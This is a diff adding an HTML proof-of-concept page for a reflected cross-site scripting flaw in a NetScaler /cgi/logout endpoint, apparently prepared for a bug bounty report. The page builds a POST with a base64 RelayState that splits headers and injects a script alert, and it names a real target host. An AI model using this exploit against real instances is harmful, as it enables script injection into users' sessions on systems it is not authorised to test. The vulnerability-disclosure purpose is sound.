@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>NetScaler /cgi/logout RXSS PoC (POST RelayState)</title>
+  <meta name="referrer" content="no-referrer" />
+  <style>
+    body { font-family: Arial, sans-serif; margin: 24px; }
+    code, pre { background: #f6f8fa; padding: 10px; border-radius: 8px; display: block; overflow:auto; }
+    .btn { padding: 10px 14px; border: 0; border-radius: 8px; background: #111827; color: #fff; cursor: pointer; }
+    .note { color: #374151; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h2>NetScaler RXSS PoC. POST /cgi/logout</h2>
+
+  <p class="note">
+    This PoC sends a POST request to <code>/cgi/logout</code> with attacker-controlled RelayState.
+    On affected instances, the response renders attacker-controlled content and triggers JavaScript execution.
+  </p>
+
+  <script>
+    // Change this to the target instance you are validating.
+    const TARGET = "https://connect.vivoenergy.com";
+
+    // Constant SAMLResponse used for the minimal repro (same as report).
+    const SAML_RESPONSE =
+      "PD94bWwgdmVyc2lvbj0iMS4wIj8+PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2Fz" +
+      "aXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2Vy" +
+      "dGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIg" +
+      "VmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD50ZXN0QGV4YW1wbGUuY29tPC9zYW1sOk5h" +
+      "bWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+";
+
+    // RelayState format: base64 of CRLF + Content-Type + CRLF CRLF CRLF + payload
+    // Payload: <script>alert(1)</script>
+    const RELAYSTATE_B64 =
+      "DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4=";
+
+    function buildForm() {
+      const form = document.getElementById("pocForm");
+      form.action = TARGET.replace(/\/+$/, "") + "/cgi/logout";
+
+      document.getElementById("saml").value = SAML_RESPONSE;
+      document.getElementById("relay").value = RELAYSTATE_B64;
+
+      document.getElementById("targetOut").textContent = form.action;
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      buildForm();
+
+      // Auto-submit. Comment this out if you prefer manual click.
+      // setTimeout(() => document.getElementById("pocForm").submit(), 500);
+    });
+  </script>
+
+  <p>Target URL: <code id="targetOut"></code></p>
+
+  <form id="pocForm" method="POST" enctype="application/x-www-form-urlencoded" target="_self">
+    <input type="hidden" id="saml" name="SAMLResponse" value="" />
+    <input type="hidden" id="relay" name="RelayState" value="" />
+    <button class="btn" type="submit">Send PoC POST</button>
+  </form>
+
+  <h3>Notes</h3>
+  <ul>
+    <li>The PoC uses a standard HTML form POST. Browsers cannot attach custom headers such as <code>X-HackerOne-Research</code> via a normal form submission. For header-tagged reproduction, please replay the same request in Burp (as included in the report).</li>
+    <li>If the instance responds with a 302 and HTML body, the payload is rendered in the response and triggers execution (alert).</li>
+  </ul>
+
+  <h3>RelayState value used</h3>
+  <pre>DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4=</pre>
+</body>
+</html>
